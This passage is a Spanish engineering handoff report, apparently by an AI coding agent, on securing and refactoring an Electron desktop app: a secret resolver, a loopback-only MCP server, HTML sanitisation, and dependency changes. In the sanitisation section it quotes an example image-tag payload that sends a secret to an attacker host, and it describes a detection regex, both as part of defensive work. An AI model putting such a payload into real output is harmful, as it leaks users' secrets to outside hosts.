# A4 — Ola 1b — Handoff

> **Agente:** A4 · **Zona de escritura:** `apps/desktop/**` (EXCEPTO `apps/desktop/renderer/floating/vendor/avatar/**` → A6).
> **Plan:** `docs/agent-ops/plans/2026-10-19-remediation-wave1/A4-desktop.md` (T1–T15) + Ola 1b (T0–T8).
> **Contrato:** `docs/agent-ops/plans/2026-10-19-remediation-wave1/README.md`.
> **Fecha:** 2026-10-20 · **Commits:** ninguno (árbol sucio a propósito, por instrucción del owner).

---

## 1. Estado del repo al cerrar la Ola 1b

| Comprobación | Resultado |
|---|---|
| `pnpm typecheck` (global, recursivo) | **exit 0** |
| `pnpm lint` (global) | **exit 0** |
| `pnpm --filter @ego/desktop test` | **54 ficheros / 331 tests pasan** (+5 skipped) |
| `pnpm --filter @ego/renderer test` | **64 ficheros / 428 tests pasan** |
| `pnpm --filter @ego/desktop build` | **exit 0** - `verify-dist.cjs`: *TODOS LOS CHEQUEOS EN VERDE* (2 checks nuevos del corpus legal) |
| `pnpm --filter @ego/renderer build` | **exit 0** |

### 1.1 T0 — la regresión de typecheck (PRIORIDAD ABSOLUTA): RESUELTA

**Causa:** A6 replicó el corpus de atribución MIT (`agent-robot-avatar/`, `coucou/`, `coucou-swift/`) dentro del espejo vendorizado (`apps/desktop/renderer/floating/vendor/avatar/vendor/`). El `include` del `tsconfig` del renderer cubría `floating` entero → el corpus entraba en el typecheck y fallaba (le faltan los tipos de `@tauri-apps/api`, usa un tsconfig propio y no es código de Ego).

**Fix (mi zona: `apps/desktop/renderer/tsconfig.json`):** `exclude` del corpus. **No se borra nada** — la cadena MIT sigue resoluble.

```diff
-  "include": ["src", "components", "lib", "hooks", "test", "floating"]
+  "include": ["src", "components", "lib", "hooks", "test", "floating"],
+  "exclude": ["node_modules", "dist", "floating/vendor/avatar/vendor"]
```

**Verificado:**
- (a) `pnpm typecheck` → **exit 0** (antes: 12+ errores TS2307/TS7006/TS2322 en `floating/vendor/avatar/vendor/**`).
- (b) El corpus **no** se compila ni entra en el bundle: `out/renderer/` no lo contiene (verificado por el check 6.bis de `verify-dist.cjs`).
- (c) `node packages/avatar/scripts/check-attribution.mjs` → **exit 0**: *"CADENA MIT RESOLUBLE: toda ruta citada existe en el repositorio"* (3 ficheros legales, 5 familias, 31 ficheros, 9 rutas en cabeceras, 32 ficheros de corpus).

---

## 2. Tareas de la Ola 1b: estado por tarea

| Tarea | Estado | Evidencia |
|---|---|---|
| **T0** typecheck rojo por el corpus legal | ✅ | `renderer/tsconfig.json` → `exclude`. `pnpm typecheck` exit 0 |
| **T1** `secretResolver` inyectado (R2) | ✅ | `src/main/mcp/secret-resolver.ts` (nuevo) + `packages/integrations/src/mcp/McpManager.ts` (option nueva, 4 líneas) + `test/mcp-secret-resolver.test.ts` (4 tests) |
| **T2** `EgoMcpServer` arrancado (R1) | ✅ | `src/main/mcp/mcp-http-server.ts` + `mcp-server-runtime.ts` (nuevos) + `main.ts` los arranca + `test/mcp-http-server.test.ts` (9) + `test/mcp-server-runtime.test.ts` (5) |
| **T3** DOMPurify + CSP `img-src` | ✅ | `renderer/lib/sanitize-html.ts` (nuevo) + `shiki-highlight.tsx` + `artifact-card.tsx` + `test/MarkdownSanitization.test.tsx` (9) |
| **T4** `DomainCanvasView` sin ramas (R3) | ✅ | `renderer/components/domains/{views,domain-registry,types}.ts(x)` (nuevos) + `test/DomainCanvasRegistry.test.tsx` (5) |
| **T5** Legacy del personaje (R14/R15) + avatar canónico | ✅ | `CharacterCanvas.tsx` y `CharacterMiniBadge.tsx` **eliminados**; FSM **retirada** → `state/character-state.ts`; 4 diffs de A6 aplicados + validados; `test/CharacterLegacy.test.tsx` (7) || **T6** `pnpm.overrides` (para A7) | ✅ | `apps/desktop/package.json` y `renderer/package.json` subidos a las versiones resueltas. Diff exacto de la raíz en §5 |
| **T7** Corpus legal en el artefacto | ✅ | `scripts/copy-avatar-attribution.cjs` (nuevo) + paso en el `build` + 2 checks en `verify-dist.cjs` |
| **T8** Diff E de A2 (resumidor LLM) | ✅ | `main.ts`: `createRouterSummarizer(modelRouter, {role:"fast-classifier"})` → `compactionJob.compact(..., {summarizer})`. `test/compaction-summarizer-wiring.test.ts` (3) |
| **+** Deuda de T8 (Ola 1) cerrada: el store no re-renderiza por delta | ✅ | `chat-transcript-store.ts`: `appendToLastMessage` conserva la identidad del array Y del último mensaje. `test/ChatTranscriptNoGlobalRerender.test.ts` (4) |

---

## 3. T1 — El `secretResolver` (R2): la decisión D2 ya es efectiva

### 3.1 El defecto

`McpManager` construía el cliente MCP **sin opciones** (`new McpClient(config)`) → el `secretResolver` (que `McpClient` YA soportaba desde A3) **nunca llegaba**. Los marcadores `{{SECRET:<clave>}}` viajaban sin resolver: el subproceso recibía un marcador literal en vez del token. **D2 era inerte en producción.**

### 3.2 El fix (2 ficheros)

**`packages/integrations/src/mcp/McpManager.ts`** (A3 es su dueño; cambio **mínimo, aditivo y opcional**, bajo la reasignación explícita R2 del VERDICT §4.2 → "Dueño asignado: **A4**"):

```diff
+import type { SecretResolver } from "./SecretProxy.js";
 export interface McpManagerOptions {
   tokenStore?: McpTokenStore;
+  /**
+   * Resolver de secretos (Decisión D2 / VERDICT R2).
+   * Se propaga al `McpClient` para que los marcadores `{{SECRET:<clave>}}`
+   * se resuelvan **en el punto de uso** (la petición saliente al servidor) y
+   * NO en el `env` del subproceso. Sin resolver, el marcador viaja intacto
+   * (fail-closed: el servidor recibe un marcador, nunca el token).
+   */
+  secretResolver?: SecretResolver;
 }
 export class McpManager {
   private readonly secretResolver?: SecretResolver;
   constructor(registry?: ToolRegistry, options: McpManagerOptions = {}) {
     ...
+    this.secretResolver = options.secretResolver;
   }
-    const client = new McpClient(config);
+    const client = new McpClient(config, { secretResolver: this.secretResolver });
```

**`apps/desktop/src/main/mcp/secret-resolver.ts`** (nuevo, mi zona): `createCredentialSecretResolver(store)` → un `SecretResolver` sobre el `CredentialManager` (keychain del SO). Clave `<servicio>:<cuenta>` (p. ej. `github:pat`); sin `:` → servicio por defecto `mcp`. **Fail-closed**: clave desconocida o fallo del keychain → `undefined` → el marcador viaja intacto. **Nunca loguea el valor.**

**`apps/desktop/src/main.ts`**: cableado real, con el tokenStore que faltaba:

```diff
-  mcpManager = new McpManager(toolRegistry);
+  // T1 (VERDICT R2) — Decisión D2 (proxy de secretos MCP): el resolver se
+  // resuelve SIEMPRE contra el keychain del SO, en el main: el renderer
+  // nunca ve un secreto.
+  mcpManager = new McpManager(toolRegistry, {
+    tokenStore: getMcpCredentialManager(),
+    secretResolver: createCredentialSecretResolver(getMcpCredentialManager()),
+  });
```

> Nota: el `tokenStore` **tampoco** estaba cableado (era `undefined` → `getTokenStore()` devolvía `undefined` y los conectores MCP no tenían fuente de secretos). Queda arreglado de paso.

### 3.3 El test (TDD, RED demostrado)

`apps/desktop/test/mcp-secret-resolver.test.ts` — arranca un **servidor MCP real** (subproceso `node`, comando en la allowlist `MCP_COMMAND_ALLOWLIST`) y comprueba:

| # | Propiedad | Resultado |
|---|---|---|
| (a) | el `env` del subproceso **no contiene el secreto en claro** | ✅ `expect(seenBySubprocess).not.toContain("VALOR_REAL_EN_CLAVE")` |
| (b) | el marcador **llega** al subproceso | ✅ `expect(seenBySubprocess).toContain("{{SECRET:d2svc:d2acct}}")` |
| (c) | el cliente lo **resuelve en el punto de uso** (la petición saliente) | ✅ `expect(textOf(echoed)).toBe("token=VALOR_REAL_EN_CLAVE")` y `not.toContain("{{SECRET:")` |
| (d) | el `McpManager` **propaga** el resolver al cliente que crea | ✅ `tools/list` + `tools/call` sobre `manager.getClient(...)` |
| (e) | **fail-closed**: sin secreto conocido, el marcador viaja intacto | ✅ |

**Ciclo RED→GREEN demostrado** (reverting la línea de `McpManager` y reconstruyendo `dist`):

```
###### RED: revierto la propagacion del resolver ######
AssertionError: expected '{{SECRET:d2svc:d2acct}}' to be 'VALOR_REAL_EN_CLAVE'
 Test Files  1 failed | 3 passed (4)
###### GREEN: restauro ######
 Test Files  1 passed (4)
```

> **Trampa documentada:** los tests de `@ego/desktop` consumen el **`dist/` compilado** de `@ego/integrations`, no el `src/`. Un cambio en `packages/integrations/**` **exige `pnpm --filter @ego/integrations build`** antes de ver el efecto. Sin ese rebuild, el test "pasa" contra el código viejo.

---

## 4. T2 — `EgoMcpServer` arrancado (R1): cierra `AGENTS.md` §7

### 4.1 Decisión de transporte (para ratificación del owner)

**Ratifico la decisión del orquestador**: **HTTP streamable en `127.0.0.1`, en-proceso (NO proceso hijo stdio).**

Razón (ya argumentada, con el matiz que aporta esta implementación): las tools y la memoria viven en el **proceso main** (VantaDB vía `EgoMemoryAdapter`, `ToolRegistry`, `ApprovalEngine`). Un servidor en un proceso hijo stdio obligaría a proxiar **todo** (tools + memoria) por el pipe y duplicaría el runtime → el catálogo expuesto sería una copia desincronizada, no el catálogo real. In-proceso, `tools/list` devuelve **el `ToolRegistry` de verdad**.

**Por qué HTTP y no stdio también para el in-proceso:** `EgoMcpServer` expone `handleRequest(request)` (agnóstico de transporte) + `startStdio()`. El transporte HTTP lo implemento yo en `apps/desktop/src/main/mcp/mcp-http-server.ts` (mi zona), sin tocar `packages/integrations/**`. Además, HTTP sobre loopback es lo que permite a **otro proceso** (un cliente MCP externo) hablar con Ego sin exponerse a la LAN; stdio solo hablaría con un padre que lo lanza.

**Alternativa considerada y descartada:** exponerlo en `0.0.0.0` (o en un socket Unix) → rechazada: el requisito de seguridad es *loopback only* + token.

### 4.2 Seguridad implementada (los 4 puntos obligatorios)

| Requisito | Implementación | Test |
|---|---|---|
| (a) **solo loopback**, nunca `0.0.0.0` | `startEgoMcpHttpServer` **lanza** si el host no es `127.0.0.1`/`::1`/`localhost`. El enlace es explícito a `127.0.0.1`. | `rejects.toThrow(/loopback/i)` para `0.0.0.0` y `::` |
| (b) **bearer token obligatorio**, nunca en disco ni en el renderer en claro | 32 bytes aleatorios (`base64url`), **persistido cifrado** en el `CredentialManager` (keychain del SO) bajo `mcp/ego-mcp-server`, **reutilizado** entre arranques (un cliente externo puede cachearlo). **Nunca** en la URL, **nunca** en la respuesta, **nunca** en el renderer. El log de arranque imprime **solo la URL**. | `expect(handle.url).not.toContain("token")` + `expect(JSON.stringify(body)).not.toContain(TOKEN)` + el token persists cifrado en el vault |
| (c) **gate HITL fail-closed** | El gate es el **mismo `ApprovalEngine`** del chat: `approvalEngine.evaluateRequirement(tool, args, ctx)` → si exige aprobación, `approvalEngine.requestApproval(...)` y solo se ejecuta si `decision.approved === true`. Sin gate, el propio `EgoMcpServer` rechaza (fail-closed de A3). | `tools/call` de `borrar_archivo` (destructive) → `gateCalls` con el nombre de la tool y respuesta de error |
| (d) **rechaza sin token ANTES de tocar el registry** | El bearer se valida en el `requestListener` **antes** de parsear el body y antes de `server.handleRequest(...)` → el `ToolRegistry` no se toca. Comparación en **tiempo constante** (`timingSafeEqual`). | sin token → **401** y `expect(gateCalls).toHaveLength(0)`; token incorrecto → 401 |

Extras: `POST` JSON-RPC (batch incluido), `DELETE` cierra sesión, `GET` → 405 (SSE no implementado), rutas distintas → 404, cuerpo > 4 MB → 400.

### 4.3 Los tests (TDD)

`apps/desktop/test/mcp-http-server.test.ts` (**9 tests**): loopback, rechazo de `0.0.0.0`/`::`, 401 sin token (y registry intacto), 401 con token incorrecto, `tools/list` con el catálogo real, gate HITL que rechaza, gate que aprueba y ejecuta, el token no aparece en la respuesta ni en la URL, ruta desconocida → 404.

`apps/desktop/test/mcp-server-runtime.test.ts` (**5 tests**): el token se persiste cifrado y se reutiliza entre arranques, el catálogo expuesto es el real, el gate bloquea la tool destructiva, sin token → 401.

### 4.4 Dónde se arranca y se para

- **Arranque:** `main.ts` → `createWindow()`, después de `approvalEngine` y `toolRegistry`. Log: `[McpServer] Servidor MCP de Ego escuchando en http://127.0.0.1:<puerto>/mcp (bearer token obligatorio, loopback only).`
- **Parada:** `before-quit` → `await mcpServerHandle.close()` (libera el puerto).

**Lo que NO se hace (a propósito):** el token **no** se expone por IPC al renderer. Si el owner quiere que un cliente externo lo obtenga, hace falta un canal explícito (p. ej. un `ipc.mcp.serverToken` con aprobación) → **decisión de producto pendiente**.

---

## 5. T6 — `pnpm.overrides`: diff exacto para A7

### 5.1 Lo que YA he subido (mi zona)

```diff
--- a/apps/desktop/package.json
+++ b/apps/desktop/package.json
   "devDependencies": {
-    "electron": "^33.2.0",
-    "electron-builder": "^25.1.8",
+    "electron": "^41.10.7",
+    "electron-builder": "^26.15.3",
     "electron-vite": "^5.0.0",
     "msw": "^2",
     "typescript": "^5.6.3",
-    "vitest": "^2.1.2",
+    "vitest": "^3.2.7",
     "wait-on": "^9.5.1"
   }

--- a/apps/desktop/renderer/package.json
+++ b/apps/desktop/renderer/package.json
   "devDependencies": {
-    "@vitest/coverage-v8": "^2.1.2",
+    "@vitest/coverage-v8": "^3.2.7",
     "vite": "^6.0.0",
-    "vitest": "^2.1.2"
+    "vitest": "^3.2.7"
   }
```

Además (A6, diff 3.1) `"@ego/avatar": "workspace:*"` en `apps/desktop/package.json` **y** en `apps/desktop/renderer/package.json`.

### 5.2 El diff que A7 debe aplicar en el `package.json` RAÍZ

```diff
   "pnpm": {
     "overrides": {
-      "electron": "^41.10.7",
-      "electron-builder": "^26.15.3",
-      "app-builder-lib": "26.15.3",
-      "builder-util-runtime": "^9.7.0",
-      "vitest": "^3.2.7",
-      "@vitest/coverage-v8": "^3.2.7",
-      "tinypool": "^2.2.0",
-      "tar": "^7.5.22",
-      "vitepress>vite": "^6.4.4"
+      "vitest": "^3.2.7",
+      "tinypool": "^2.2.0",
+      "vitepress>vite": "^6.4.4"
     }
   }
```

**Qué se puede borrar YA y por qué:**

| Override | ¿Se puede borrar? | Por qué |
|---|---|---|
| `electron` | ✅ **SÍ** | `apps/desktop` ya declara `^41.10.7` (la versión que el override forzaba). |
| `electron-builder` | ✅ **SÍ** | `apps/desktop` ya declara `^26.15.3`. |
| `app-builder-lib` | ✅ **SÍ** | `electron-builder@26.15.3` declara `app-builder-lib: "26.15.3"` **exacto** → el pin era redundante. |
| `builder-util-runtime` | ✅ **SÍ** | `electron-builder@26.15.3` declara `builder-util-runtime: "9.7.0"` **exacto** → redundante. |
| `@vitest/coverage-v8` | ✅ **SÍ** | `apps/desktop/renderer` ya declara `^3.2.7`. |
| `tar` | ⚠️ **SÍ, tras verificar el install** | Con `electron-builder@26.15.3` → `app-builder-lib@26.15.3` → `tar: ^7.5.7` (ya en rango) y `@electron/rebuild: ^4` → `node-gyp@^10` → `tar@^7`. El `tar@6` que forzaba el override venía de `node-gyp@6` ← `@electron/rebuild@3/6` ← `electron-builder@25`. **Verificar tras el install** (no puedo confirmarlo sin `pnpm install`). |
| `vitest` | ❌ **NO TODAVÍA** | **17 paquetes** (zona de A2) siguen declarando `vitest@^2.1.2`: `dailystate, decision, domains, events, execution, integrations, knowledge, memory, models, recovery, runtime, security, subegos, tasks, tool-call-repair, tools, ui-runtime`. Cuando A2 los suba a `^3.2.7`, el override se puede borrar. |
| `tinypool` | ❌ **DEBE PERMANECER** | `vitest@3.2.7` declara `tinypool: ^1.1.1`; el override fuerza un **major** (2.2.0) sobre una dependencia **transitiva** que no se puede expresar en los manifiestos (vitest no es de nadie de esta ola). Es un override de *seguridad*, no de resolución. |
| `vitepress>vite` | ➡️ **Decisión de A7** | Scope a `vitepress` (dependencia de docs). No es de mi zona. |

### 5.3 Lo que falta: `vantadb-node` (dependencia de la Orchestrator)

A7 (B5) pidió en `apps/desktop/package.json`:

```diff
-    "vantadb-node": "file:../../../VantaDB/vantadb-node"
+    "vantadb-node": "file:../../vendor/vantadb-node/vantadb-node-0.8.0.tgz"
```

**NO LO HE APLICADO**, y es deliberado: **`vendor/` no existe en el repo** (`vendor/vantadb-node/vantadb-node-0.8.0.tgz` no está). Aplicar el cambio ahora dejaría el repo **rojo** (dependencia no resoluble). El orden correcto es:

1. **La Orchestrator** copia el tarball:
   `C:\Users\Eros\VantaDB Proyect\VantaDB\vantadb-node\vantadb-node-0.8.0.tgz`
   → `C:\Users\Eros\VantaDB Proyect\Ego\vendor\vantadb-node\vantadb-node-0.8.0.tgz` (2 598 617 bytes).
2. **A4** aplica el diff de arriba en `apps/desktop/package.json` **y** en `packages/memory/package.json` (A2).
3. **A7** ejecuta `pnpm install` para reescribir el lockfile con el `integrity`:
   `sha512-8u1bMpncEpQhtrar94M/qNZ9RsUdOdFmYHpo7gR79NuABlCPa4nPDlEcQgGjLBGWQ0ntdM7fRuEPI6/iZF61zw==`.

**Aviso (incidencia vivida durante esta ola):** una instalación concurrente dejó `vantadb-node` **a medio copiar** en el store de pnpm (solo el `.node`, sin `index.js`/`index.cjs`/`index.d.ts`/`package.json`) → 37 tests de main caían con `VantaError: connect (is the native binding built?)`. Se reparó copiando los 4 ficheros desde el directorio fuente al store. **Si A7 vuelve a ver ese error, es esto.**

---

## 6. T3 — DOMPurify + CSP `img-src`

### 6.1 Hallazgo (medido, no inferido)

**El chat NO usa `react-markdown`.** `components/assistant-ui/markdown-text.tsx` es un parser propio que emite **nodos de texto de React** (auto-escapados) y bloques `<pre>`: en esa ruta **no hay inyección de HTML**.

Los dos puntos donde sí entra HTML al DOM del renderer son:

1. `components/assistant-ui/shiki-highlight.tsx` → `dangerouslySetInnerHTML` con el HTML del worker de Shiki.
2. `components/assistant-ui/artifact-card.tsx` → `<iframe srcDoc={...}>` con el artifact HTML/SVG **que genera el modelo** (entrada no confiable).

El (2) es el vector de exfiltración real: un artifact con `<img src="https://attacker.example/?x=<secreto>">` hace que el renderer pida esa URL (con las cookies/token de sesión en el `Referer`).

### 6.2 Qué he hecho

**`apps/desktop/renderer/lib/sanitize-html.ts`** (nuevo): dos capas.

- **Capa 1 — DOMPurify** (la primitive de librería; D3: no se reimplementa el sanitizador): allowlist estructural de tags y atributos. Elimina `<script>`, `<iframe>`, `<object>`, `<style>`, `<form>`, handlers inline…
- **Capa 2 — política de Ego** (`enforceLocalResourcePolicy`): lo que DOMPurify **por diseño NO impone**:
  - **solo recursos locales** (DOMPurify permite `http(s):` en `href`/`src` porque su allowlist de URI es la de un documento web; aquí un artifact no puede pedir nada a la red),
  - **sin handlers inline** (`on*`),
  - **sin elementos que carguen o ejecuten** (`script`, `style`, `iframe`, `object`, `embed`, `link`, `meta`, `form`…).

La capa 2 es una transformación de cadena **determinista y testeable en cualquier DOM**; la capa 1 es la que aporta la potencia del parser.

**Cableado:**
- `shiki-highlight.tsx`: `dangerouslySetInnerHTML={{ __html: sanitizeShikiHtml(html) }}` (capa 2: el HTML viene de **nuestro** worker y depende de sus `class`/`style` inline → un allowlist que los elimine rompería el resaltado).
- `artifact-card.tsx`: `srcDoc={sanitizedPreview}` (capa 1 + capa 2: el artifact lo genera el modelo → no confiable).

**La CSP `img-src 'self' data: blob:`** (que ya introduje en la Ola 1) se mantiene como la **segunda capa**: el test verifica que `img-src` no contiene `*`, `https:` ni `http:` en `renderer/index.html` **y** que `buildCsp(true)` (main) tampoco.

### 6.3 El test (TDD, 9 tests en `test/MarkdownSanitization.test.tsx`)

`RED demostrado` antes de integrar: **7 de 9 fallaban** (el HTML de Shiki y el del artifact se inyectaban **crudos**).

Verifica: (1) el artifact no conserva imágenes remotas; (2) ni scripts, ni iframes, ni `javascript:`, ni `onclick`; (3) los recursos **locales** se conservan; (4) el HTML de Shiki se sanea conservando el marcado del tema; (5) el regex de recursos remotos detecta `https:`/`http:`/`//host`/`javascript:`/`file:` y **no** marca `local.png`, `/assets/x.png`, `data:image/png;base64,…` (un `data:image/svg+xml` **sí** es remoto: un SVG embebido puede llevar script); (6) el Markdown del chat no usa `dangerouslySetInnerHTML`; (7) Shiki y el artifact pasan por el sanitizador; (8) la CSP restringe `img-src`.

### 6.4 ⚠️ Limitación documentada de DOMPurify en `happy-dom`

**Medido:** DOMPurify 3.4.17 bajo `happy-dom` (el `environment` de vitest en el renderer) es **errático**: con la configuración por defecto ignora su propia allowlist de URI (deja vivos `href="https://…"` y `onclick`) y el resultado **depende del orden** de las llamadas (el singleton comparte `ALLOWED_TAGS`/`ALLOWED_ATTR` mutables). Con `ALLOWED_TAGS` como **array** (la forma que `_resolveSetOption` soporta) el allowlist de tags sí aplica, pero el de atributos no.

**Por eso el diseño es de dos capas**: la **capa 2 (política de Ego) es la que garantiza las propiedades de seguridad** y es determinista en cualquier DOM; DOMPurify es la capa de allowlist estructural (correcta en Chromium, que es el objetivo real). Además, `sanitizeArtifactHtml` crea una **instancia fresca** de DOMPurify por llamada (`DOMPurify(window)`) para eliminar el estado compartido.

**Consecuencia asumida:** en `happy-dom` DOMPurify es *más* restrictivo de lo normal (drop de `src` relativos). En Chromium se comporta como se espera. Si en el futuro se quiere unit-testear el allowlist estructural de DOMPurify, hace falta un DOM más fiel (`jsdom`) → **dependencia nueva → A7**.

---

## 7. T4 — `DomainCanvasView` sin ramas hardcoded (R3)

### 7.1 Qué había

`components/domains/DomainCanvasView.tsx` (959 líneas) tenía **10 ramas `domainId === "…"`**: 5 en el efecto de carga (`:228,244,257,292,304`) y 5 en el render (`:426,501,626,827,859`). `componentKind` era metadato muerto.

### 7.2 Qué hay ahora

| Fichero | Papel |
|---|---|
| `components/domains/views.tsx` (nuevo) | Las **5 vistas** como componentes **autosuficientes**: cada una declara su estado, carga sus datos del bridge y renderiza su vista. El JSX se movió **verbatim** (el script `scripts/t11-extract-domains.cjs` + `t11-gen-views.cjs` lo extrajo de forma mecánica). |
| `components/domains/domain-registry.ts` (nuevo) | Registra las 5 vistas en el **registry dinámico** (`getCanvasComponentRegistry()`, singleton de `@ego/ui-runtime` migrado por A3) bajo su `componentKind`: `engineering_status`, `product_backlog`, `knowledge_facts`, `analytics_telemetry`, `crm_pipeline`. |
| `components/domains/types.ts` (nuevo) | Tipos y guardas compartidos (`WorktreeStatusItem`, `ProductListItem`, `KnowledgeFact`, `CrmDealItem`, `CrmSummary`, `isRecord`, `asString`, `flatMapValid`, `toXxx`). Evita el import circular entre el padre y las vistas. |
| `components/domains/DomainCanvasView.tsx` (reescrito, 62 líneas) | **Sin una sola rama**: `domainId` → `componentKind` (tabla única `DOMAIN_COMPONENT_KINDS`) → `resolveDomainView(componentKind)` → se renderiza. Si no hay vista registrada → **error honesto** (nunca datos inventados). |

### 7.3 El test (TDD)

`test/DomainCanvasRegistry.test.tsx` (5 tests). **RED→GREEN demostrado** restaurando el fichero original:

```
###### RED: DomainCanvasView original (10 ramas) ######
AssertionError: expected 'import React, { useEffect, useState, …' not to match /domainId\s*===\s*"/"
 Test Files  1 failed | 4 passed (5)
###### GREEN: restaurado ######
 Test Files  1 passed (5)
```

Verifica: (1) **no hay ramas por `domainId`** en el fuente; (2) los 5 dominios canónicos tienen `componentKind` **y** renderer registrado; (3) **un `componentKind` NO hardcodeado se renderiza** (hot-swap por el registry); (4) un dominio con `componentKind` registrado en runtime se renderiza; (5) **los 5 dominios canónicos siguen renderizando su vista** (no se rompe la funcionalidad existente).

---

## 8. T5 — Legacy del personaje (R14/R15) + `@ego/avatar` canónico

### 8.1 R14 — `CharacterCanvas.tsx` y `CharacterMiniBadge.tsx`: ELIMINADOS

Definidos y **nunca renderizados** (0 usos JSX en todo el repo, 0 usos en tests). Eran dos superficies de UI duplicadas que nadie mantenía. Se eliminan también sus exports del barrel `components/character/index.ts` (que ahora solo exporta lo que se usa).

### 8.2 R15 — `CharacterStateMachine`: RETIRADA (decisión, con justificación)

**Decisión: se RETIRA la clase** (no se instancia). Sobrevive el **vocabulario** `CharacterState` (los 14 estados canónicos), que es el contrato chat ↔ badge.

**Justificación (4 puntos):**

1. **Nunca se instanció**: 0 `new CharacterStateMachine()` en todo el repo; solo se importaba su *tipo*. Eran ~250 líneas de código muerto.
2. **Sería una segunda fuente de verdad de la física**: el motor canónico es `@ego/avatar` (ADR-0018) y la interpolación (canales `gazeX`, `open`, `pulse`, `aura`, `tilt`, `energy`, `squash*`) **vive ya ahí**, con su propio `smoothingFactor`. Una FSM de interpolación en el renderer duplicaría ese smoothing con otros parámetros.
3. **El estado que la UI necesita es el estado OBJETIVO**, no el interpolado: lo computa el `useMemo` de `ego-chat.tsx` a partir del contexto del chat (streaming, tool call, error, aprobación). Pasarlo por una FSM con smoothing haría que el avatar **retrasase** respecto al chat (el estado real llegaría después del hecho) y volvería el resultado dependiente del tiempo.
4. **No deja cobertura huérfana**: los 2 ficheros de test del personaje (`character-badge-selector.test.ts`, `character-state-machine.test.ts`) se han actualizado — el primero cubre ahora el vocabulario + el mapeo al motor; el segundo (el test de la FSM) se elimina con la clase.

> ⚠️ **Esto es una decisión de producto** (el VERDICT la marca como "decisión del owner"). Mi recomendación es **retirar** (lo que he hecho) porque instanciarla exigiría un rediseño del contrato chat↔avatar (estado objetivo vs. estado interpolado) y un segundo motor de animación. Si el owner prefiere instanciarla, el punto de enganche es `ego-chat.tsx:793` (el `useMemo` que calcula `avatarLiveState`).

**Ficheros:** `state/CharacterStateMachine.ts` → **eliminado**; `state/character-state.ts` → **nuevo** (el tipo `CharacterState` + `CANONICAL_CHARACTER_STATES`); `state/index.ts` → actualizado; `CharacterBadge.tsx` y `ego-chat.tsx` → imports actualizados.

### 8.3 Los 14 estados runtime: intactos

`CANONICAL_CHARACTER_STATES` es **exactamente** la lista original (14 estados, mismos nombres: `idle, listening, thinking, generating, searching, using_tool, waiting, approval_required, question, success, warning, error, sleeping, attention`). El test `test/CharacterLegacy.test.tsx` lo verifica, y `mapCharacterStateToAvatarState` (el mapeo al vocabulario de `<ego-avatar>`) **no se ha tocado**.

### 8.4 A6 — los 4 diffs de una línea: APLICADOS y VALIDADOS

| # | Fichero | Cambio |
|---|---|---|
| 3.1 | `apps/desktop/package.json` | `"@ego/avatar": "workspace:*"` en `dependencies` |
| 3.1b | `apps/desktop/renderer/package.json` | `"@ego/avatar": "workspace:*"` (el renderer es quien importa el motor) |
| 3.2 | `renderer/components/character/CharacterBadge.tsx:13` | `import "@ego/avatar/runtime/avatar-element.js";` (sustituye al espejo vendorizado) |
| 3.3 | `renderer/floating/floating-avatar.tsx:70` | `await import("@ego/avatar/runtime/avatar-element.js");` |
| 3.4 | `renderer/floating/floating-sound.ts:380` | `await import("@ego/avatar/runtime/sound.js");` |

**Decisión de aplicación (A6, §3.5 advertía de la MPA):** apliqué los diffs como **reemplazo literal**, NO como "paquete + fallback". Motivo **medido**: con el fallback (try/catch), el bundler emitía **DOS chunks de 181 KB** (el del paquete y el del espejo) → **+181 KB duplicados** en la app distribuida. Con el reemplazo: **1 chunk de 181 KB**. El espejo vendorizado **no se borra** (decisión D5: las tres copias se mantienen) → sigue en el repo, con la puerta `sync:check` y la atribución MIT resolubles.

**Validación de la advertencia de A6 (§3.5):**

| Check | Resultado |
|---|---|
| `pnpm --filter @ego/desktop build` | **exit 0** |
| `verify-dist.cjs` | **TODOS LOS CHEQUEOS EN VERDE** |
| `customElements.define("ego-avatar", …)` presente en el chunk emitido | ✅ `out/renderer/assets/avatar-element-SqdZxvI_.js` (181 216 bytes) |
| La MPA del flotante lo carga | ✅ `out/renderer/floating/floating.html` → `floating-DchbSvYT.js` → chunk del motor |
| Duplicación del motor | ❌ ninguna → **1 chunk** (antes: 2) |

**Puente temporal (hasta que A7 cierre el lockfile):** como el enlace de workspace de `@ego/avatar` todavía no está instalado, el paquete **no resuelve** en runtime ni en TS. Lo resuelvo con alias/paths, **todos en mi zona**:

| Fichero | Qué |
|---|---|
| `apps/desktop/renderer/vite.config.ts` | `resolve.alias` → `packages/avatar/src/**` |
| `apps/desktop/electron.vite.config.ts` | ídem (cubre la MPA del flotante) |
| `apps/desktop/renderer/tsconfig.json` | `paths` → los **`.d.ts`** siblings (el paquete es JS plano) |
| `apps/desktop/vitest.config.ts` | `resolve.alias` (los tests de main importan el badge) |

**Cuando A7 ejecute `pnpm install`**, estos alias/paths se pueden quitar (el enlace de workspace basta). Lo dejo documentado aquí para que no se olvide.

> **Aviso a A6/A1:** el motor **sigue siendo JavaScript plano** con tipos públicos a mano (`packages/avatar/index.d.ts`); la excepción de tipado del `AGENTS.md` (ya redactada por A1) sigue vigente. Yo no he tocado `packages/avatar/**` ni el espejo vendorizado.

### 8.5 El test (TDD)

`test/CharacterLegacy.test.tsx` (**7 tests**): (1) `CharacterCanvas`/`CharacterMiniBadge` ya no existen; (2) el barrel no los exporta; (3) la FSM no existe y el vocabulario sí; (4) nadie instancia la FSM y los imports apuntan al módulo nuevo; (5) el motor se importa desde el paquete y el espejo **sigue en el repo**; (6) el renderer declara la dependencia; (7) `CharacterState` sigue siendo el contrato chat ↔ badge.

### 8.6 Test ajeno adaptado: `floating-avatar-vendor.test.ts` (FIND-12-01)

Este guard (ajeno a la Ola 1b, de la Ola anterior) afirmaba que el specifier del motor **debe** ser `./vendor/...` — es decir, **prohibía** el cambio que A6 propone. Actualizado **sin debilitar la intención** (que el specifier nunca apunte fuera del root servido, lo que causaba el 404 → `<ego-avatar>` inerte 0×0):

- Se acepta `./vendor/…` **o** `@ego/avatar/…` (un specifier de **paquete** lo resuelve Vite estáticamente → cumple la intención).
- Se sigue exigiendo: 0 `repos-referencia`, 0 `..`, y que el specifier resuelva.
- **Test nuevo:** "el motor canónico es el paquete `@ego/avatar`" → blinda el cambio de A6 contra una regresión.

> El guard de T0 (`floating/vendor/avatar/vendor/**` fuera del typecheck) no lo toco: es material legal y el `check-attribution.mjs` de A6 sigue verde.

---

## 9. T7 — El corpus legal debe viajar en el artefacto distribuido

**Problema (A6 avisa):** el corpus `vendor/` **no se emitía** porque nadie lo importa → la atribución MIT no viajaba en la app distribuida, que es lo que la licencia exige.

**Solución (mi zona: `apps/desktop/`):**

